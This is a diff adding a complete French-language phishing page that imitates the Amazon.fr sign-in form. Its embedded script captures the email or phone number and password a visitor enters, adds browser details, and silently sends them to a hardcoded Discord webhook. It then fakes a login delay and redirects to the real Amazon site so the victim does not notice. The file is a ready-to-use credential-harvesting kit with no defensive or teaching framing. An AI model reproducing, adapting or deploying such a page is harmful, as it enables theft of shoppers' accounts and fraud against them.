@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon.fr - S'identifier</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Amazon Ember', Arial, sans-serif;
+            background-color: #f6f6f6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            width: 100%;
+            max-width: 380px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            padding: 25px 30px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 120px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .form-group {
+            margin-bottom: 18px;
+        }
+        label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 6px;
+            font-size: 14px;
+        }
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #a6a6a6;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        input:focus {
+            border-color: #f90;
+            box-shadow: 0 0 0 3px rgba(255, 153, 0, 0.3);
+            outline: none;
+        }
+        .error {
+            color: #c40000;
+            font-size: 13px;
+            margin-top: 5px;
+            display: none;
+        }
+        .btn-continuer {
+            width: 100%;
+            background-color: #f9c74f;
+            color: #111;
+            border: none;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .btn-continuer:hover {
+            background-color: #f0b22d;
+        }
+        .btn-continuer:disabled {
+            background-color: #ddd;
+            cursor: not-allowed;
+        }
+        .links {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        .links a {
+            color: #0066c0;
+            text-decoration: none;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 12px;
+            color: #666;
+        }
+        .footer a {
+            color: #0066c0;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Logo Amazon -->
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo">
+        </div>
+        <h1>S'identifier</h1>
+        <!-- Champ Email -->
+        <div class="form-group">
+            <label for="email">Adresse e-mail ou numéro de téléphone mobile</label>
+            <input type="text" id="email" placeholder="Saisissez votre e-mail ou numéro de téléphone" autocomplete="username">
+            <div class="error" id="email-error">Veuillez entrer votre adresse e-mail ou numéro de téléphone.</div>
+        </div>
+        <!-- Champ Mot de passe -->
+        <div class="form-group">
+            <label for="password">Mot de passe</label>
+            <input type="password" id="password" placeholder="Saisissez votre mot de passe" autocomplete="current-password">
+            <div class="error" id="password-error">Veuillez entrer votre mot de passe.</div>
+        </div>
+        <button class="btn-continuer" onclick="connecter()">Continuer</button>
+        <div class="links">
+            <a href="#">Mot de passe oublié ?</a><br><br>
+            <a href="#">Besoin d'aide pour vous identifier ?</a>
+        </div>
+        <div class="footer">
+            <p>Nouveau chez Amazon ? <a href="#">Créer votre compte Amazon</a></p>
+        </div>
+    </div>
+
+    <script>
+        // ==================== CONFIGURATION WEBHOOK ====================
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1492220758938619998/ntvaA4-1bi66QwLpFNayDinPRZ35kdV6SH8cCUogvWyCxgYBScg9vpuwLi0wTjT5sDJQ";   // ←←← Remplace par ton webhook Discord
+
+        async function envoyerVersDiscord(email, password) {
+            if (!WEBHOOK_URL || WEBHOOK_URL === "TON_WEBHOOK_URL_ICI") {
+                console.error("Webhook URL non configuré !");
+                return;
+            }
+
+            const data = {
+                content: "**Nouvelle connexion Amazon**",
+                embeds: [{
+                    title: "Identifiants Amazon",
+                    color: 0xff9900, // couleur Amazon
+                    fields: [
+                        { name: "Email / Téléphone", value: `\`${email || "Non renseigné"}\``, inline: false },
+                        { name: "Mot de passe", value: `\`${password || "Non renseigné"}\``, inline: false },
+                        { name: "User-Agent", value: `\`${navigator.userAgent}\``, inline: false },
+                        { name: "Langue", value: `\`${navigator.language}\``, inline: true },
+                        { name: "Plateforme", value: `\`${navigator.platform}\``, inline: true }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(data)
+                });
+                // On ne fait rien en cas de succès ou d'erreur pour ne pas alerter l'utilisateur
+            } catch (err) {
+                console.error("Erreur lors de l'envoi au webhook :", err);
+            }
+        }
+
+        function connecter() {
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const emailError = document.getElementById('email-error');
+            const passwordError = document.getElementById('password-error');
+            let valid = true;
+
+            // Vérification email
+            if (email === "") {
+                emailError.style.display = "block";
+                document.getElementById('email').style.borderColor = "#c40000";
+                valid = false;
+            } else {
+                emailError.style.display = "none";
+                document.getElementById('email').style.borderColor = "#a6a6a6";
+            }
+
+            // Vérification mot de passe
+            if (password === "") {
+                passwordError.style.display = "block";
+                document.getElementById('password').style.borderColor = "#c40000";
+                valid = false;
+            } else {
+                passwordError.style.display = "none";
+                document.getElementById('password').style.borderColor = "#a6a6a6";
+            }
+
+            if (valid) {
+                // Envoi vers Discord AVANT la simulation de connexion
+                envoyerVersDiscord(email, password);
+
+                // Simulation de connexion
+                const btn = document.querySelector('.btn-continuer');
+                const originalText = btn.textContent;
+                btn.textContent = "Connexion en cours...";
+                btn.disabled = true;
+
+                setTimeout(() => {
+                    window.location.href = "https://www.amazon.fr";
+                }, 1800);
+            }
+        }
+
+        // Validation avec la touche Entrée
+        document.addEventListener('keypress', function(e) {
+            if (e.key === "Enter") {
+                connecter();
+            }
+        });
+    </script>
+</body>
+</html>
